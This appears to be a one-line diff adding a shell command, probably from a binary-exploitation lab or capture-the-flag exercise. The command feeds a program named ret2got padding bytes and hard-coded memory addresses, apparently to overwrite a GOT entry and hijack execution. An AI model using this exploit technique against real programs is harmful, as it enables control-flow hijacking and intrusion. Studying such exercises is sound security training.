@@ -1,0 +1,1 @@
+./ret2got `perl -e 'print "A"x8; print "\x0c\xa0\x04\x08"'` `perl -e 'print "\x46\x83\x04\x08"'` 
